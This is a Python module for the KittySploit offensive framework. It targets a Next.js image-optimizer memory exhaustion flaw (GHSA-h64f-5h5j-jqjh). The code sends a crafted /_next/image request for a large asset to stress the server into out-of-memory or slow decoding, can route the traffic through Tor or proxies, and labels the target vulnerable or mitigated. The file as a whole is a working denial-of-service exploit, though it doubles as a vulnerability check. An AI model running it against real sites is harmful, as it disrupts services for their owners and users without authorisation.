#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from urllib.parse import quote

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js /_next/image optimizer OOM (GHSA-h64f-5h5j-jqjh)",
        "description": (
            "GET /_next/image?url=<path>&w=&q= against a large same-origin asset. Pre-16.2.5 the "
            "optimizer may decode the full image into memory (OOM / long wall). v16.2.5 adds limits. "
            "Streams the response in 64 KiB chunks; can stress the target — use only on systems you own."
        ),
        "author": ["KittySploit Team"],
        "references": ["https://github.com/advisories/GHSA-h64f-5h5j-jqjh"],
        "tags": ["http", "dos", "nextjs", "image", "oom", "ghsa"],
    }

    image_asset_path = OptString(
        "/large.bin",
        "Value for the url= query (path to a large file the server will fetch for optimization)",
        required=False,
    )
    image_width = OptInteger(16, "w= query parameter (resize width hint)", required=False)
    image_quality = OptInteger(1, "q= query parameter", required=False)
    image_timeout = OptInteger(
        120,
        "Socket read timeout for the image GET (seconds)",
        required=False,
        advanced=True,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _root(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        return f"{proto}://{t}:{p}".rstrip("/")

    def _image_url(self):
        ap = str(self._o(self.image_asset_path) or "/large.bin").strip() or "/large.bin"
        if not ap.startswith("/"):
            ap = "/" + ap
        w = int(self._o(self.image_width))
        q = int(self._o(self.image_quality))
        return f"{self._root()}/_next/image?url={quote(ap, safe='')}&w={w}&q={q}"

    def _verify_proxies(self):
        verify = self._to_bool(self._o(self.verify_ssl))
        px = str(self._o(self.proxy) or "").strip()
        proxies = {}
        if px:
            proxies = {"http": px, "https": px}
        elif self.framework and getattr(self.framework, "is_tor_enabled", lambda: False)():
            tor = self.framework.tor_manager.get_tor_proxy_dict()
            if tor:
                proxies = tor
        elif self.framework and getattr(self.framework, "is_proxy_enabled", lambda: False)():
            u = self.framework.get_proxy_url()
            if u:
                proxies = {"http": u, "https": u, "all": u}
        return verify, proxies or None

    def _stream_get(self):
        url = self._image_url()
        verify, proxies = self._verify_proxies()
        self._configure_session()
        t0 = time.perf_counter()
        code = -1
        nbytes = 0
        err = None
        try:
            r = self.session.get(
                url,
                timeout=int(self._o(self.image_timeout)),
                verify=verify,
                proxies=proxies or None,
                stream=True,
            )
            code = r.status_code
            for chunk in r.iter_content(64 * 1024):
                if chunk:
                    nbytes += len(chunk)
            r.close()
        except requests.RequestException as e:
            err = str(e)
        return code, nbytes, time.perf_counter() - t0, err

    @staticmethod
    def _verdict(code, wall, err):
        if err or code in (500, 502, 503, 504):
            return "vulnerable", "crash/OOM or transport error"
        if code == 200 and wall > 5.0:
            return "vulnerable", f"slow decode wall={wall:.2f}s"
        if code in (400, 413, 415) and wall < 3.0:
            return "mitigated", f"fast rejection HTTP {code}"
        return "inconclusive", f"HTTP {code} wall={wall:.2f}s"

    def check(self):
        code, nbytes, wall, err = self._stream_get()
        v, reason = self._verdict(code, wall, err)
        hit = v == "vulnerable"
        return {
            "vulnerable": hit,
            "reason": reason + (f" err={err}" if err else ""),
            "confidence": "high" if hit else ("high" if v == "mitigated" else "low"),
            "probe": {"http_code": code, "bytes_read": nbytes, "wall_seconds": wall, "error": err},
        }

    def run(self) -> bool:
        url = self._image_url()
        print_info(f"GET (stream): {url}")
        code, nbytes, wall, err = self._stream_get()
        print_status(f"HTTP {code}  bytes={nbytes:,}  wall={wall:.2f}s  err={err}")
        v, msg = self._verdict(code, wall, err)
        if v == "vulnerable":
            print_error(f"Vulnerable — {msg}")
            return True
        if v == "mitigated":
            print_success(f"Likely mitigated — {msg}")
            return False
        print_warning(f"Inconclusive — {msg}")
        return False
